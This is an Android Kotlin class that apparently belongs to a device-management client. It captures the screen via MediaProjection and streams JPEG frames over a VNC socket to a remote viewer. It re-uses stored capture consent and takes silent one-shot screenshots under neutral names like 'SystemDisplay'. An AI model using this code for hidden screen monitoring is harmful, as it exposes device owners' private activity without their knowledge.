package com.mdm.client.media

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.mdm.client.config.AppConfig
import com.mdm.client.network.VncSocketClient
import java.io.ByteArrayOutputStream
import java.util.Base64
import java.util.concurrent.atomic.AtomicBoolean

class ScreenCaptureManager(
    private val context: Context,
    private val vncSocketClient: VncSocketClient
) {
    companion object {
        private const val TAG = "DispMgr"
        private const val JPEG_QUALITY = 40
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val isCapturing = AtomicBoolean(false)

    /** Latest frame captured — used for screenshot without full VNC session */
    @Volatile private var latestBitmap: Bitmap? = null

    fun initProjection(resultCode: Int, data: Intent) {
        val mpManager = context.getSystemService(MediaProjectionManager::class.java)
        mediaProjection = mpManager.getMediaProjection(resultCode, data)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.i(TAG, "MediaProjection session ended by system")
                    mediaProjection = null
                    stopCapture()
                }
            }, Handler(Looper.getMainLooper()))
        }
        Log.i(TAG, "MediaProjection initialised")
    }

    fun isProjectionAvailable(): Boolean = mediaProjection != null

    fun reinitProjection() {
        val code = AppConfig.mediaProjectionResultCode
        val data = AppConfig.mediaProjectionData
        if (code != -1 && data != null) {
            initProjection(code, data)
        }
    }

    fun startCapture(): Map<String, Any> {
        val mp = mediaProjection ?: return mapOf(
            "status" to "error",
            "message" to "MediaProjection not granted — open app and grant screen capture permission"
        )

        val metrics = context.resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val dpi = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width
                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                latestBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)

                if (vncSocketClient.isStreaming) {
                    val base64 = bitmapToBase64(latestBitmap!!)
                    vncSocketClient.sendFrame(base64, width, height)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Frame read error: ${e.message}")
            } finally {
                image.close()
            }
        }, Handler(Looper.getMainLooper()))

        virtualDisplay = mp.createVirtualDisplay(
            "SystemDisplay",
            width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface,
            null, null
        )
        isCapturing.set(true)
        Log.i(TAG, "Screen capture started (${width}x${height})")
        return mapOf("status" to "success", "message" to "VNC capture started", "active" to true)
    }

    fun stopCapture(): Map<String, Any> {
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        isCapturing.set(false)
        Log.i(TAG, "Screen capture stopped")
        return mapOf("status" to "success", "active" to false)
    }

    /** Returns the most recently captured frame as a Bitmap, or null if unavailable. */
    fun captureFrame(): Bitmap? {
        if (!isCapturing.get() || latestBitmap == null) {
            // Try a one-shot capture if we have projection but VNC isn't running
            if (mediaProjection != null && !isCapturing.get()) {
                startCapture()
                Thread.sleep(500) // brief wait for first frame
            }
        }
        return latestBitmap
    }

    fun isActive() = isCapturing.get()

    private fun bitmapToBase64(bitmap: Bitmap): String {
        val out = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
        return Base64.getEncoder().encodeToString(out.toByteArray())
    }
}
